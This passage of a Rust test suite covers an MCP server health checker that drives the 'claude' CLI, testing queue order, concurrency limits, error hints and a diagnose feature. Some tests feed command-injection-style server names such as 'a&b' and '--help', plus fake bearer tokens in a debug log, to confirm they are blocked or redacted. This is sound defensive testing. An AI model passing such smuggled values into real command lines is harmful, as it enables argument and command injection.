        // Anything said after it would be among these.
        std::thread::sleep(Duration::from_millis(300));
        while let Some(e) = core.try_recv() {
            events.push(e);
        }
        let after = after_target(&events, "loc", "new").unwrap();
        assert_eq!(
            status_of(after, "loc"),
            Some((
                Status::Unknown,
                Some("not checked: the project folder was not found".to_owned())
            )),
            "{after:#?}"
        );
    }

    #[test]
    fn a_check_the_user_asked_for_that_waits_its_turn_survives_f5() {
        // The variant: it had not started yet. A server that is off is never queued again by a refresh.
        let env = Env::new(
            &serde_json::json!({}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":800}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let project = env.dir.path().join("project");
        std::fs::create_dir_all(&project).unwrap();
        let key = project.to_string_lossy().replace('\\', "/");
        write_config(
            &env,
            &serde_json::json!({
                "mcpServers": {"busy": {"command": "x"}},
                "projects": {key.clone(): {"mcpServers": {"off": {"command": "y"}}, "disabledMcpServers": ["off"]}}
            }),
        );
        let core = start_with(
            EngineConfig {
                max_checks: 1,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| {
            status_of(e, "busy").is_some_and(|s| s.0 == Status::Checking)
        });
        core.send(Command::Check(local_id("off", &key)));
        core.send(Command::Refresh { live_all: false });
        collect(&core, |e| final_status(e, "off") == Some(Status::Connected));
        assert_eq!(
            env.gets().iter().filter(|g| g.0 == "off").count(),
            1,
            "{:?}",
            env.gets()
        );
    }

    #[test]
    fn background_checks_of_servers_on_screen_go_first() {
        let servers: serde_json::Map<String, serde_json::Value> = (0..5)
            .map(|i| (format!("s{i}"), serde_json::json!({"command": "x"})))
            .collect();
        let env = Env::new(
            &serde_json::json!({ "mcpServers": servers }),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":300}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        core.send(Command::Visible(vec![
            crate::model::ConnectionId::new(Scope::User, None, "s4"),
            crate::model::ConnectionId::new(Scope::User, None, "s3"),
        ]));
        collect(&core, |e| {
            (0..5).all(|i| final_status(e, &format!("s{i}")).is_some())
        });
        let order: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        // One may already have started before the list arrived.
        let at = |n: &str| order.iter().position(|o| o == n).unwrap();
        assert!(at("s3") <= 2 && at("s4") <= 2, "{order:?}");
        assert!(
            at("s3") < at("s4"),
            "on screen in their own order: {order:?}"
        );
    }

    #[test]
    fn check_now_replaces_the_queued_background_check_of_that_server() {
        // Re-review: the background job stayed queued, so the server was checked twice and the later answer won.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "a": {"command": "x"}, "b": {"command": "x"}, "t": http("https://t.example.com")}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":400}]}"#,
            &[("c.txt", CONNECTED)],
        );
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-health-cache.json"),
            r#"{"version":1,"servers":{"t":{"status":"failed"}}}"#,
        )
        .unwrap();
        let core = env.start();
        collect(&core, |e| {
            e.iter().any(|x| {
                matches!(
                    x,
                    Event::Status {
                        status: Status::Checking,
                        ..
                    }
                )
            })
        });
        core.send(Command::Check(user_id("t")));
        collect(&core, |e| {
            ["a", "b"].iter().all(|n| final_status(e, n).is_some())
        });
        std::thread::sleep(Duration::from_millis(600));
        let asked = env.gets().iter().filter(|g| g.0 == "t").count();
        assert_eq!(asked, 1, "{:?}", env.gets());
    }

    #[test]
    fn a_server_switched_on_twice_is_queued_once() {
        // Variant: reloads before its check ran must not queue it twice.
        let config = |off: bool| {
            serde_json::json!({
                "mcpServers": {"slow": {"command": "x"}, "t": {"command": "x"}},
                "projects": {"/p": {"disabledMcpServers": if off { vec!["t"] } else { vec![] }}}
            })
        };
        let env = Env::new(
            &config(true),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get","slow"],"stdout_file":"c.txt","delay_ms":2500},
                        {"args":["mcp","get","t"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        collect(&core, |e| {
            e.iter().any(|x| {
                matches!(
                    x,
                    Event::Status {
                        status: Status::Checking,
                        ..
                    }
                )
            })
        });
        for off in [false, true, false] {
            write_config(&env, &config(off));
            collect(&core, |e| !snapshots(e).is_empty());
        }
        collect(&core, |e| final_status(e, "t").is_some());
        std::thread::sleep(Duration::from_millis(300));
        let asked = env.gets().iter().filter(|g| g.0 == "t").count();
        assert_eq!(asked, 1, "{:?}", env.gets());
    }

    #[test]
    fn f5_checks_the_servers_with_nothing_to_show_first() {
        // Re-review: F5 jobs lost the unknown-first order.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "k0": http("https://a.example.com"), "k1": http("https://b.example.com"),
                "k2": http("https://c.example.com"), "z": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        recently_needing_auth(&env, &["k0".to_owned(), "k1".to_owned(), "k2".to_owned()]);
        let core = start_with(
            EngineConfig {
                max_checks: 1,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| final_status(e, "z").is_some());
        core.send(Command::Refresh { live_all: true });
        collect(&core, |e| {
            ["k0", "k1", "k2", "z"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        let order: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(order, ["z", "z", "k0", "k1", "k2"]);
    }

    #[test]
    fn checks_asked_for_one_after_another_run_in_the_order_asked() {
        // Performance review: `push_now` put each new ask in front, so klefki-cli's checks ran in reverse.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "s": {"command": "x"}, "k0": {"command": "x"}, "k1": {"command": "x"}, "k2": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get","s"],"stdout_file":"c.txt","delay_ms":300},
                        {"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = start_with(
            EngineConfig {
                max_checks: 1,
                background_checks: false,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| !snapshots(e).is_empty());
        for name in ["s", "k0", "k1", "k2"] {
            core.send(Command::Check(user_id(name)));
        }
        collect(&core, |e| {
            ["s", "k0", "k1", "k2"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        let order: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(order, ["s", "k0", "k1", "k2"]);
    }

    #[test]
    fn a_server_asked_for_again_while_waiting_moves_to_the_end_of_the_asks() {
        // Variant: the second ask replaces the first, behind the asks made in between.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "s": {"command": "x"}, "k0": {"command": "x"}, "k1": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get","s"],"stdout_file":"c.txt","delay_ms":300},
                        {"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = start_with(
            EngineConfig {
                max_checks: 1,
                background_checks: false,
                ..env.config()
            },
            || {},
        );
        collect(&core, |e| !snapshots(e).is_empty());
        for name in ["s", "k0", "k1", "k0"] {
            core.send(Command::Check(user_id(name)));
        }
        collect(&core, |e| {
            ["s", "k0", "k1"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        std::thread::sleep(Duration::from_millis(200));
        let order: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(order, ["s", "k1", "k0"]);
    }

    #[test]
    fn a_background_check_that_panics_gives_its_slot_back() {
        let queue = Mutex::new(Queue::default());
        let wake = Condvar::new();
        lock(&queue).background_running = 1;
        let caught = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            let _slot = BackgroundSlot {
                queue: &queue,
                wake: &wake,
            };
            panic!("a check went wrong");
        }));
        assert!(caught.is_err());
        assert_eq!(lock(&queue).background_running, 0);
    }

    #[test]
    fn a_known_server_switched_on_from_outside_is_checked() {
        // Cross-review of this slice: only unknown servers were checked after a change.
        let config = |off: bool| {
            serde_json::json!({
                "mcpServers": {"known": http("https://a.example.com")},
                "projects": {"/p": {"disabledMcpServers": if off { vec!["known"] } else { vec![] }}}
            })
        };
        let env = Env::new(
            &config(true),
            r#"{"rules":[{"args":["mcp","get"],"stdout_file":"f.txt"},{"args":["--version"]}]}"#,
            &[("f.txt", FAILED)],
        );
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-health-cache.json"),
            r#"{"version":1,"servers":{"known":{"status":"healthy"}}}"#,
        )
        .unwrap();
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        assert!(env.gets().is_empty(), "it is off");
        write_config(&env, &config(false));
        let events = collect(&core, |e| final_status(e, "known").is_some());
        assert_eq!(final_status(&events, "known"), Some(Status::Failed));
        assert!(
            !events.iter().any(
                |e| matches!(e, Event::Status { id, status: Status::Checking, .. }
                if id.name == "known")
            ),
            "its last-known status stays while it is checked"
        );
    }

    #[test]
    fn a_known_server_that_cannot_be_checked_keeps_its_last_known_status() {
        // Cross-review: a refused check sent "not checked" over the cache's status. A variant: the unknown one still
        // says why it is not checked.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "a&b": http("https://a.example.com"),
                "c&d": http("https://c.example.com"),
                "ok": http("https://b.example.com")}}),
            r#"{"rules":[{"args":["mcp","get"],"stdout_file":"c.txt"},{"args":["--version"]}]}"#,
            &[("c.txt", CONNECTED)],
        );
        std::fs::write(
            env.dir.path().join("cfg").join("mcp-health-cache.json"),
            r#"{"version":1,"servers":{"a&b":{"status":"healthy"}}}"#,
        )
        .unwrap();
        let core = env.start();
        let events = collect(&core, |e| {
            final_status(e, "ok").is_some() && final_status(e, "c&d").is_some()
        });
        assert_eq!(status_of(&events, "a&b"), None, "{events:?}");
        let (status, detail) = status_of(&events, "c&d").unwrap();
        assert_eq!(status, Status::Unknown);
        assert!(detail.unwrap().contains("not checked"));
    }

    #[test]
    fn project_servers_are_only_checked_on_request_and_run_in_their_folder() {
        let env = Env::new(
            &serde_json::json!({}),
            r#"{"rules":[{"args":["--version"]},
            {"args":["mcp","get","docs"],"stdout_file":"p.txt"}]}"#,
            &[("p.txt", PENDING)],
        );
        let project = env.dir.path().join("proj");
        std::fs::create_dir_all(&project).unwrap();
        std::fs::write(
            project.join(".mcp.json"),
            r#"{"mcpServers":{"docs":{"command":"node"}}}"#,
        )
        .unwrap();
        std::fs::write(
            env.dir.path().join("cfg").join(".claude.json"),
            serde_json::json!({"projects": {project.to_string_lossy(): {}}}).to_string(),
        )
        .unwrap();
        let core = env.start();
        let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        std::thread::sleep(Duration::from_millis(600));
        assert!(env.gets().is_empty(), "nothing runs until the user asks");
        let Event::Snapshot(snap) = &events[0] else {
            panic!()
        };
        let row = snap
            .servers
            .iter()
            .find(|r| r.scope == Scope::Project)
            .unwrap();

        core.send(Command::Check(row.id()));
        let events = collect(&core, |e| final_status(e, "docs").is_some());
        assert_eq!(final_status(&events, "docs"), Some(Status::PendingApproval));
        let log = std::fs::read_to_string(&env.log).unwrap();
        let start: serde_json::Value = log
            .lines()
            .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
            .find(|l| l["event"] == "start" && l["argv"][2] == "docs")
            .unwrap();
        assert_eq!(
            std::path::Path::new(start["cwd"].as_str().unwrap()).file_name(),
            project.file_name()
        );
    }

    #[test]
    fn a_plugins_servers_are_never_checked_not_even_on_request() {
        // Decision 008: their names (`plugin:p:s`) are not ones Klefki passes to `claude`, and they have no file key.
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"ok": {"command": "x"}}, "projects": {"/p": {}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let cfg = env.dir.path().join("cfg");
        let root = cfg.join("plugins").join("cache").join("p");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(
            root.join(".mcp.json"),
            r#"{"mcpServers":{"web":{"type":"http","url":"https://w.example.com"},"cmd":{"command":"y"}}}"#,
        )
        .unwrap();
        std::fs::write(
            cfg.join("plugins").join("installed_plugins.json"),
            serde_json::json!({"plugins": {"p@m": [{"scope": "user", "installPath": root.to_string_lossy()}]}})
                .to_string(),
        )
        .unwrap();
        std::fs::write(
            cfg.join("settings.json"),
            r#"{"enabledPlugins":{"p@m":true}}"#,
        )
        .unwrap();
        let core = env.start();
        let events = collect(&core, |e| final_status(e, "ok").is_some());
        let snap = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => Some(Arc::clone(s)),
                _ => None,
            })
            .unwrap();
        let plugin_rows: Vec<&ServerRow> = snap
            .servers
            .iter()
            .filter(|r| r.scope == Scope::Plugin)
            .collect();
        assert_eq!(plugin_rows.len(), 2, "{:#?}", snap.servers);
        for row in &plugin_rows {
            core.send(Command::Check(row.id()));
            core.send(Command::Diagnose(row.id()));
        }
        core.send(Command::Check(ServerId::new(Scope::User, None, "ok")));
        let later = collect(&core, |e| final_status(e, "ok").is_some());
        std::thread::sleep(Duration::from_millis(300));
        assert_eq!(
            env.gets().into_iter().map(|g| g.0).collect::<Vec<_>>(),
            ["ok", "ok"],
            "only the user server ran"
        );
        // Not even a "not checked": nothing was tried.
        assert!(
            !events.iter().chain(&later).any(|e| matches!(e,
                Event::Status { id, .. } | Event::Diagnosis { id, .. } if id.scope == Scope::Plugin)),
            "{events:?} {later:?}"
        );
    }

    #[test]
    fn a_name_that_is_not_safe_never_reaches_the_cli() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "a&b": {"command": "x"}, "--help": {"command": "x"}, "ok": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get","ok"],"stdout_file":"c.txt"}]}"#,
            &[("c.txt", CONNECTED)],
        );
        let core = env.start();
        let events = collect(&core, |e| {
            ["a&b", "--help", "ok"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        assert_eq!(final_status(&events, "ok"), Some(Status::Connected));
        for bad in ["a&b", "--help"] {
            let (status, detail) = status_of(&events, bad).unwrap();
            assert_eq!(status, Status::Unknown, "{bad}");
            assert!(detail.unwrap().contains("not checked"), "{bad}");
        }
        let asked: Vec<String> = env.gets().into_iter().map(|g| g.0).collect();
        assert_eq!(
            asked,
            vec!["ok"],
            "only the valid name was ever passed to the CLI"
        );
    }

    #[test]
    fn at_most_three_checks_run_at_once() {
        // Each stub run sleeps a full second so that a slow process start under load cannot hide the overlap.
        let servers: serde_json::Map<String, serde_json::Value> = (0..6)
            .map(|i| (format!("s{i}"), serde_json::json!({"command": "x"})))
            .collect();
        let env = Env::new(
            &serde_json::json!({ "mcpServers": servers }),
            r#"{"rules":[{"args":["--version"]},{"args":["mcp","get"],"stdout_file":"c.txt","delay_ms":1000}]}"#,
            &[("c.txt", CONNECTED)],
        );
        // Claude checked them all just now, so startup checks none; the pool is used when the user asks (F5).
        // (This test used to count the startup checks, which now run one at a time.)
        recently_needing_auth(&env, &(0..6).map(|i| format!("s{i}")).collect::<Vec<_>>());
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        assert!(env.gets().is_empty(), "nothing is checked at startup");
        core.send(Command::Refresh { live_all: true });
        collect(&core, |e| {
            (0..6).all(|i| final_status(e, &format!("s{i}")).is_some())
        });
        let gets = env.gets();
        assert_eq!(gets.len(), 6);
        let max_overlap = gets
            .iter()
            .map(|(_, start, _)| {
                gets.iter()
                    .filter(|(_, s, e)| s <= start && start < e)
                    .count()
            })
            .max()
            .unwrap();
        assert!(max_overlap <= 3, "{max_overlap} checks overlapped");
        assert!(
            max_overlap >= 2,
            "the pool should actually run in parallel, saw {max_overlap}"
        );
    }

    #[test]
    fn cli_failures_become_unknown_with_a_reason() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "missing": {"command": "x"}, "slow": {"command": "x"}, "garbage": {"command": "x"}}}),
            r#"{"rules":[{"args":["--version"]},
                {"args":["mcp","get","missing"],"stderr_file":"nf.txt","exit_code":1},
                {"args":["mcp","get","slow"],"hang":true},
                {"args":["mcp","get","garbage"],"stdout_file":"g.txt"}]}"#,
            &[
                ("nf.txt", b"No MCP server named \"missing\"."),
                ("g.txt", b"something completely different\n"),
            ],
        );
        let mut config = env.config();
        // Roomy on purpose: with many tests starting processes at once, a normal start can take a second.
        config.check_timeout = Duration::from_secs(3);
        let core = start_with(config, || {});
        let events = collect(&core, |e| {
            ["missing", "slow", "garbage"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        for (name, needle) in [
            ("missing", "No MCP server named"),
            ("slow", "timed out"),
            ("garbage", "unrecognised"),
        ] {
            let (status, detail) = status_of(&events, name).unwrap();
            assert_eq!(status, Status::Unknown, "{name}");
            let detail = detail.unwrap_or_default();
            assert!(detail.contains(needle), "{name}: {detail:?}");
        }
    }

    fn hint_of(events: &[Event], name: &str) -> Option<Hint> {
        events.iter().rev().find_map(|e| match e {
            Event::Status { id, hint, .. } if id.name == name => Some(hint.clone()),
            _ => None,
        })?
    }

    fn pointing_at(focus: Focus) -> Hint {
        Hint {
            title: "t".into(),
            code: None,
            help: Vec::new(),
            points_at: Some((focus, "label".into())),
        }
    }

    fn spanned<'a>(focus: Focus, target: &'a str, said: Option<&str>) -> Option<&'a str> {
        pointing_at(focus)
            .span(target, said)
            .map(|range| &target[range])
    }

    #[test]
    fn a_hint_points_at_the_part_of_the_url_it_is_about() {
        let url = "https://acme-prod.example.com/gateway/mcp";
        assert_eq!(
            spanned(Focus::Host, url, None),
            Some("acme-prod.example.com")
        );
        assert_eq!(
            spanned(Focus::Address, url, None),
            Some("acme-prod.example.com")
        );
        assert_eq!(spanned(Focus::Path, url, None), Some("/gateway/mcp"));
        // Variants: a port, an IPv6 address, user info, a hidden query, no path at all.
        let port = "http://127.0.0.1:9/mcp";
        assert_eq!(spanned(Focus::Host, port, None), Some("127.0.0.1"));
        assert_eq!(spanned(Focus::Address, port, None), Some("127.0.0.1:9"));
        assert_eq!(
            spanned(Focus::Host, "http://[::1]:8080/mcp", None),
            Some("[::1]")
        );
        assert_eq!(
            spanned(Focus::Address, "http://[::1]:8080/mcp", None),
            Some("[::1]:8080")
        );
        assert_eq!(
            spanned(Focus::Host, "https://me@host.example/x", None),
            Some("host.example")
        );
        assert_eq!(
            spanned(Focus::Path, "https://host.example/mcp?…", None),
            Some("/mcp")
        );
        assert_eq!(spanned(Focus::Path, "https://host.example", None), None);
        // A URL focus never points into a command line, nor a command focus into a URL.
        assert_eq!(spanned(Focus::Host, "npx -y pkg", None), None);
        assert_eq!(spanned(Focus::Command, url, None), None);
    }

    #[test]
    fn a_hint_points_at_the_program_even_when_its_path_has_spaces() {
        assert_eq!(spanned(Focus::Command, "npx -y pkg", None), Some("npx"));
        assert_eq!(
            spanned(
                Focus::Command,
                "npx -y pkg",
                Some("Error: spawn npx ENOENT")
            ),
            Some("npx")
        );
        let spaced = r"C:\Program Files\nodejs\node.exe server.js --port 9";
        assert_eq!(
            spanned(
                Focus::Command,
                spaced,
                Some(
                    r"'C:\Program Files\nodejs\node.exe' is not recognized as an internal or external command"
                )
            ),
            Some(r"C:\Program Files\nodejs\node.exe")
        );
        // Without Claude naming it, only the first word is certain.
        assert_eq!(spanned(Focus::Command, spaced, None), Some(r"C:\Program"));
        let none = Hint {
            points_at: None,
            ..pointing_at(Focus::Host)
        };
        assert_eq!(none.span("https://h.example/mcp", None), None);
    }

    #[test]
    fn a_hint_is_named_by_the_code_it_was_reported_with() {
        let enotfound = hint(
            HintKind::HostNotFound,
            "getaddrinfo ENOTFOUND acme.example.com",
        );
        assert_eq!(enotfound.code.as_deref(), Some("ENOTFOUND"));
        let again = hint(
            HintKind::HostNotFound,
            "getaddrinfo EAI_AGAIN acme.example.com",
        );
        assert_eq!(again.code.as_deref(), Some("EAI_AGAIN"));
        // Whole words only: a host or port containing the digits is not a status code.
        let port = hint(
            HintKind::Forbidden,
            "forbidden by http://h.example:14030/mcp",
        );
        assert_eq!(port.code, None);
        assert_eq!(
            hint(HintKind::Forbidden, "HTTP 403 Forbidden")
                .code
                .as_deref(),
            Some("403")
        );
        assert_eq!(
            hint(HintKind::HostNotFound, "could not resolve host").code,
            None
        );
        assert_eq!(enotfound.help.len(), HintKind::HostNotFound.help().len());
        assert_eq!(
            enotfound.points_at,
            Some((Focus::Host, "this name could not be looked up".into()))
        );
    }

    #[test]
    fn an_unknown_host_is_explained_as_the_network_or_vpn_with_claudes_words_kept() {
        // How Claude reports an HTTP server whose host name it cannot look up, e.g. a company server off the VPN.
        let issue = |name: &str, said: &str| {
            format!(
                "{name}:\n  Scope: User config (available in all your projects)\n  Status: ✘ Failed to connect\n  Issue: {said}\n  Type: http\n  URL: https://{name}.example.com/mcp\n"
            )
        };
        let enotfound = issue(
            "acme-prod",
            "ENOTFOUND: getaddrinfo ENOTFOUND acme-prod.example.com",
        );
        // The variant: the lookup failed for now (no answer from the DNS server) rather than for good.
        let eai_again = issue("acme-dev", "getaddrinfo EAI_AGAIN acme-dev.example.com");
        let env = Env::new(
            &serde_json::json!({"mcpServers": {
                "acme-prod": http("https://acme-prod.example.com/mcp"),
                "acme-dev": http("https://acme-dev.example.com/mcp"),
                "azure-devops": {"type": "stdio", "command": "npx"}}}),
            r#"{"rules":[
                {"args":["--version"],"stdout_file":"version.txt"},
                {"args":["mcp","get","acme-prod"],"stdout_file":"prod.txt"},
                {"args":["mcp","get","acme-dev"],"stdout_file":"dev.txt"},
                {"args":["mcp","get","azure-devops"],"stdout_file":"connected.txt"}]}"#,
            &[
                ("version.txt", b"2.1.302 (Claude Code)\n"),
                ("prod.txt", enotfound.as_bytes()),
                ("dev.txt", eai_again.as_bytes()),
                ("connected.txt", CONNECTED),
            ],
        );
        let core = env.start();
        let events = collect(&core, |e| {
            ["acme-prod", "acme-dev", "azure-devops"]
                .iter()
                .all(|n| final_status(e, n).is_some())
        });
        for (name, said) in [
            ("acme-prod", "getaddrinfo ENOTFOUND acme-prod.example.com"),
            ("acme-dev", "getaddrinfo EAI_AGAIN acme-dev.example.com"),
        ] {
            let (status, detail) = status_of(&events, name).unwrap();
            assert_eq!(status, Status::Failed, "{name}");
            assert!(
                detail.as_deref().is_some_and(|d| d.contains(said)),
                "{name}: Claude's own words stay available: {detail:?}"
            );
            let hint = hint_of(&events, name).unwrap_or_else(|| panic!("{name}: no explanation"));
            assert!(
                !hint.title.contains("ENOTFOUND") && !hint.title.contains("getaddrinfo"),
                "{name}: the title is plain language: {hint:?}"
            );
            // The usual causes, being offline or off the VPN, come before the rarer typo in the URL.
            let advice = hint.help.join(" ").to_lowercase();
            let at = |word: &str| advice.find(word).unwrap_or(usize::MAX);
            assert!(
                at("offline") < at("typo") && at("vpn") < at("typo"),
                "{name}: {hint:?}"
            );
        }
        assert_eq!(
            hint_of(&events, "azure-devops"),
            None,
            "a connected server needs no explanation"
        );
    }

    #[test]
    fn a_missing_cli_is_reported_and_nothing_crashes() {
        let env = Env::new(
            &serde_json::json!({"mcpServers": {"a": {"command": "x"}}}),
            r#"{"rules":[]}"#,
            &[],
        );
        let mut config = env.config();
        config.claude = None;
        config.path_var = Some(env.dir.path().join("empty").into());
        let core = start_with(config, || {});
        let events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::CliProblem(_)))
        });
        assert!(matches!(&events[0], Event::Snapshot(s) if s.servers.len() == 1));
        assert!(
            status_of(&events, "a").is_none(),
            "no check can run without the CLI"
        );
    }

    #[test]
    fn a_detached_core_carries_commands_and_events_both_ways() {
        let (core, engine) = Core::detached();
        core.send(Command::Refresh { live_all: true });
        assert!(matches!(
            engine.commands.try_recv(),
            Ok(Command::Refresh { live_all: true })
        ));
        assert!(core.try_recv().is_none());
        engine
            .events
            .send(Event::CliVersion(Some("1.2.3".to_owned())))
            .unwrap();
        assert!(matches!(core.try_recv(), Some(Event::CliVersion(Some(v))) if v == "1.2.3"));
    }

    #[test]
    fn the_ui_is_woken_when_events_arrive() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        let env = Env::new(
            &serde_json::json!({}),
            r#"{"rules":[{"args":["--version"]}]}"#,
            &[],
        );
        let woken = Arc::new(AtomicUsize::new(0));
        let w = Arc::clone(&woken);
        let core = start_with(env.config(), move || {
            w.fetch_add(1, Ordering::SeqCst);
        });
        collect(&core, |e| !e.is_empty());
        assert!(woken.load(Ordering::SeqCst) >= 1);
    }

    // ---- Diagnose: the client's own debug output, made safe ----

    const DEBUG_STDIO: &[u8] = include_bytes!("../../../fixtures/debug/failed-stdio.log");

    fn diagnosis_of(events: &[Event], name: &str) -> Option<Diagnosis> {
        events.iter().rev().find_map(|e| match e {
            Event::Diagnosis { id, diagnosis } if id.name == name => Some(diagnosis.clone()),
            _ => None,
        })
    }

    fn diagnose_env(extra_rules: &str, files: &[(&str, &[u8])], servers: serde_json::Value) -> Env {
        let scenario = format!(r#"{{"rules":[{{"args":["--version"]}}{extra_rules}]}}"#,);
        Env::new(
            &serde_json::json!({ "mcpServers": servers }),
            &scenario,
            files,
        )
    }

    fn diagnose_args() -> &'static str {
        r#""args":["--debug","mcp","--debug-file","*","mcp","get","bad-stdio"]"#
    }

    #[test]
    fn diagnose_explains_a_failing_stdio_server() {
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", DEBUG_STDIO), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "definitely-not-a-real-command-xyz"}}),
        );
        let mut config = env.config();
        // Keep the startup check out of the way: the server already has a status.
        config.max_checks = 3;
        let core = start_with(config, || {});
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let row = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(row));
        let events = collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        let d = diagnosis_of(&events, "bad-stdio").unwrap();
        assert_eq!(d.status, Status::Failed);
        assert_eq!(d.note, None);
        assert_eq!(d.hints.len(), 1, "{:?}", d.hints);
        assert_eq!(d.hints[0].title, "The command was not found");
        assert_eq!(
            d.server_said,
            vec![
                "'definitely-not-a-real-command-xyz' is not recognized as an internal or external command,",
                "operable program or batch file.",
            ]
        );
        assert!(d.client_log.iter().any(|l| l.contains("CONNECTION_CLOSED")));
        assert!(
            d.client_log.iter().all(|l| l.contains("bad-stdio")),
            "no start-up noise"
        );
    }

    #[test]
    fn diagnose_cleans_up_its_private_temp_file() {
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", DEBUG_STDIO), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "x"}}),
        );
        let core = env.start();
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let id = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(id));
        collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        let log = std::fs::read_to_string(&env.log).unwrap();
        let debug_path = log
            .lines()
            .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
            .find_map(|l| {
                let argv = l["argv"].as_array()?.clone();
                let at = argv.iter().position(|a| a == "--debug-file")?;
                argv.get(at + 1)?.as_str().map(PathBuf::from)
            })
            .expect("the CLI was asked to write a debug file");
        assert!(!debug_path.exists(), "the debug file is deleted");
        assert!(
            !debug_path.parent().unwrap().exists(),
            "and so is its private folder"
        );
        assert_ne!(
            debug_path.parent().unwrap(),
            env.dir.path(),
            "it never wrote into our own folders"
        );
    }

    #[test]
    fn diagnose_never_lets_a_secret_through() {
        let hostile = b"2026-10-17T20:00:00.000Z [DEBUG] MCP server \"bad-stdio\": HTTP transport options: {\"headers\":{\"Authorization\":\"Bearer ENGINESECRET1\"}}\n\
2026-10-17T20:00:01.000Z [ERROR] \"MCP server \\\"bad-stdio\\\" Server stderr: API_KEY=ENGINESECRET2 broke\"\n";
        let rule = format!(
            r#",{{{},"debug_file_from":"dbg.log","stdout_file":"failed.txt"}}"#,
            diagnose_args()
        );
        let env = diagnose_env(
            &rule,
            &[("dbg.log", hostile), ("failed.txt", FAILED)],
            serde_json::json!({"bad-stdio": {"command": "x"}}),
        );
        let core = env.start();
        let events = collect(&core, |e| final_status(e, "bad-stdio").is_some());
        let id = events
            .iter()
            .find_map(|e| match e {
                Event::Snapshot(s) => s.servers.first().map(|r| r.id()),
                _ => None,
            })
            .unwrap();
        core.send(Command::Diagnose(id));
        let events = collect(&core, |e| diagnosis_of(e, "bad-stdio").is_some());
        let dump = format!("{:?}", diagnosis_of(&events, "bad-stdio").unwrap());
        assert!(!dump.contains("ENGINESECRET"), "{dump}");
    }

    #[test]
    fn diagnose_refuses_a_name_that_is_not_safe_without_running_anything() {
        let env = diagnose_env("", &[], serde_json::json!({"a&b": {"command": "x"}}));
        let core = env.start();
        let events = collect(&core, |e| e.iter().any(|x| matches!(x, Event::Snapshot(_))));
        let Event::Snapshot(snap) = &events[0] else {
            panic!()
        };
        core.send(Command::Diagnose(snap.servers[0].id()));
        let events = collect(&core, |e| diagnosis_of(e, "a&b").is_some());
        let d = diagnosis_of(&events, "a&b").unwrap();
        assert_eq!(d.status, Status::Unknown);
        assert!(d.note.unwrap().contains("not diagnosed"));
